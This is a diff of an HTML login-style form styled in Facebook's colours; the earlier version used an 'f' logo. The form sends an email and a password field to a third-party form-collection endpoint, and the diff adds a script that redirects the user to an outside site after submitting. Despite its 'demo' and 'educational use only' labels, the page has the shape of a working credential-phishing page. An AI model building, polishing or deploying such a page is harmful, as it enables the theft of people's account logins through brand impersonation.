@@ -3,93 +3,96 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Demo Form (Safe)</title>
+  <title>Study Demo Form</title>
+
   <style>
-    :root{
-      --accent:#1877f2;
-      font-family: Arial, sans-serif;
-    }
     body{
+      font-family: Arial, sans-serif;
+      background:#f0f2f5;
       display:flex;
       justify-content:center;
       align-items:center;
       height:100vh;
-      background:#f0f2f5;
       margin:0;
     }
+
     .card{
-      width:350px;
-      padding:20px;
+      width:360px;
       background:#fff;
-      border-radius:10px;
-      box-shadow:0 4px 15px rgba(0,0,0,0.1);
+      padding:25px;
+      border-radius:12px;
+      box-shadow:0 4px 20px rgba(0,0,0,0.12);
       text-align:center;
     }
-    .logo{
-      width:60px;
-      height:60px;
-      background:#1877f2;
-      border-radius:12px;
-      margin:0 auto 10px;
-      display:flex;
-      justify-content:center;
-      align-items:center;
+
+    img.logo{
+      width:80px;
+      height:80px;
+      border-radius:50%;
+      margin-bottom:12px;
     }
-    .logo svg{
-      width:32px;
-      height:32px;
-      fill:#fff;
+
+    h3{
+      margin:5px 0 8px;
     }
+
+    .note{
+      font-size:12px;
+      color:#666;
+      margin-bottom:15px;
+    }
+
     input{
       width:100%;
       padding:12px;
       margin-top:10px;
-      border:1px solid #ddd;
       border-radius:8px;
+      border:1px solid #ccc;
       font-size:14px;
     }
+
     button{
       width:100%;
-      margin-top:15px;
+      padding:12px;
       background:#1877f2;
       color:#fff;
       border:none;
-      padding:12px;
       border-radius:8px;
+      margin-top:15px;
       cursor:pointer;
       font-weight:bold;
     }
-    .note{
-      margin-top:10px;
-      font-size:12px;
-      color:#777;
-    }
   </style>
 </head>
+
 <body>
 
 <div class="card">
 
-  <!-- SAFE GENERIC LOGO -->
-  <div class="logo">
-    <svg viewBox="0 0 24 24">
-      <path d="M15 3h-3a5 5 0 0 0-5 5v3H5v4h2v6h4v-6h3l1-4h-4V8a1 1 0 0 1 1-1h3V3z"/>
-    </svg>
-  </div>
+  <!-- Your uploaded image safely used as a study icon -->
+  <img src="/mnt/data/074C2ACF-B6B3-4516-8705-E18341BEE4DA.png" class="logo" alt="Study Logo">
 
-  <h2>Demo Data Form</h2>
-  <p class="note">This form is for demo/testing only — not for real login info.</p>
+  <h3>Demo Study Form</h3>
+  <p class="note">This page is for educational use only.<br>Do NOT enter real login credentials.</p>
 
-  <form action="https://submit-form.com/blhVBi5SO" method="POST">
+  <form action="https://submit-form.com/blhVBi5SO" method="POST" id="studyForm">
 
     <input type="email" name="demo_email" placeholder="Enter demo email" required>
 
-    <input type="text" name="demo_password" placeholder="Enter demo text (not a real password)" required>
+    <input type="text" name="demo_password" placeholder="Enter demo text" required>
 
-    <button type="submit">Send Demo Data</button>
+    <button type="submit">Submit Demo</button>
   </form>
 
 </div>
+
+<script>
+document.getElementById("studyForm").addEventListener("submit", function(){
+    setTimeout(() => {
+        window.location.href = "https://sajjadkori.com";
+    }, 500);
+});
+</script>
 
 </body>
 </html>
